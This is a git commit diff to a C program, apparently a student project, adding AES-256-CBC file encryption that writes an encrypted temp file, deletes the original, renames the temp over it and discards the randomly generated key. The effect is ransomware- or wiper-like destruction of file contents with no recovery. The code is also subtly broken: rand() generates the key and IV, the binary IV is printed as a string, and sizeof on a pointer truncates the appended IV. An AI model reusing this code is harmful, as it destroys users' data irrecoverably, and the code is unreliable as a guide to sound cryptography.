e7040e24c3018dd83ca5c9e656cbc5a2b1f4eef6
Jonathan Lamoureux <jlamoureux@stetson.edu>
2022-10-20 14:51:44 -0400

    Added encryption functionality

--- main.c
+++ main.c
@@ -6,12 +6,19 @@
 #include <openssl/aes.h>
 #include <openssl/rand.h>
 
-void encrypt(unsigned char *key, unsigned char *iv) {
+void encrypt(unsigned char *key) {
     // AES Encryption parameters
     int block_size = 16; // AES uses 128-bit block size encryption
     EVP_CIPHER_CTX *ctx;
     ctx = EVP_CIPHER_CTX_new(); // New ctx cipher
     
+    unsigned char *iv = malloc(16); // IV is always 16 bytes
+    // Generate the IV
+    size_t i;
+    for (i = 0; i < 16; i++) {
+         iv[i] = rand();
+    }
+    printf("%s", iv);    
     // Initiate cipher and store key/iv in it
     EVP_CipherInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv, 1);
 
@@ -38,15 +45,26 @@ void encrypt(unsigned char *key, unsigned char *iv) {
             break;
         }
     }
+
+    // Cipher the block 
+    EVP_CipherFinal_ex(ctx, buffer_out, &out_len);
+    fwrite(buffer_out, sizeof(unsigned char), out_len, temp_output);
+    EVP_CIPHER_CTX_cleanup(ctx);
+    fclose(temp_output);
     
+    // Append the IV to the file for decryption later
+    temp_output = fopen(fileTemp, "a");
+    fwrite(iv, sizeof(unsigned char), sizeof(iv), temp_output);
+
     // Close the file when encryption is complete
     fclose(curr_file);
+    remove(fileName); // Delete the current file
+    rename(fileTemp, fileName); // Rename our temp to override the current file even if it wasn't deleted
 }
 
 int main () {
     // Our cipher parameters
     int num_bytes = 32; // 256-bit key size
-    unsigned char *iv = malloc(16); // IV is always 16 bytes
     unsigned char *key = malloc(num_bytes);
     
     // Generate the key
@@ -54,17 +72,11 @@ int main () {
     for (i = 0; i < num_bytes; i++) {
          key[i] = rand();
     }
-    
-    // Generate the IV
-    for (i = 0; i < 16; i++) {
-         iv[i] = rand();
-    }
 
     // Call the encryption function to encrypt the files
-    encrypt(key, iv);
+    encrypt(key);
     
     // We don't like our keys being stored in the memory
     free(key);
-    free(iv);
     return 0;
 }
